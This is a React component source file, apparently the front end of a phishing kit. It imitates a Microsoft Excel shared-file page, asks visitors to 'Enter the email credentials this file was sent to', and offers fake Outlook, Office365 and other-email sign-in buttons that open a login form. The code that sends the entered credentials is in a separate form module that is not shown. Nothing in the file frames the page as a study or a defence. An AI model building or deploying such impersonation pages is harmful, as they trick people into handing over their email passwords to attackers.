import { useState } from "react"
import logo from './logo.svg';
import inbox from './inbox.jpg'
import email from './email.jpg'
import ex from "./ex.png"
import out from "./out.png"
import at from "./at.jpg"
import off from "./office.png"
import ms2 from "./ms2.png"
import './App.css';
import Form from "./form";
import Button from "./button";


function App() {

  const [outlook, setOutlook] = useState(false);
  const [office, setOffice] = useState(false);
  const [mail, setMail] = useState(false);


  return (
    <div className="app">
      <div className="blur"></div>

      <img src={email} alt="Email" />

      <div className="card">
        <img className="icon" src={ex} alt="Ex" />
        <h2>Microsoft Excel</h2>
        <p>Please Enter the email credentials this file was sent to.</p>

        <div className="btn">

          <Button className="outlook" handleMail={setOutlook} img={out} text="Sign in with Outlook" />

          <Button className="office" handleMail={setOffice} img={off} text="Sign in with MSOffice365" />

          <Button className="mail" handleMail={setMail} img={at} text="Sign in with other email" />

          
        </div>
      </div>

      {
        outlook ?
        <Form header="Login with Outlook" img={out} />:
        ""
        
      }
    </div>
  );
}

export default App;


{/* <button className="outlook" type="">
            <div></div>
            <img src={out} alt="out" />
            Sign in with Outlook
          </button>

          <button className="office" type="">
            <div></div>
            <img src={off} alt="office" />
            Sign in with Office365
          </button>
          
          <button className="mail" type="">
            <div></div>
            <div className="wb"></div>
            <img src={at} alt="mail" />
            Sign in with Other Mail
          </button> */}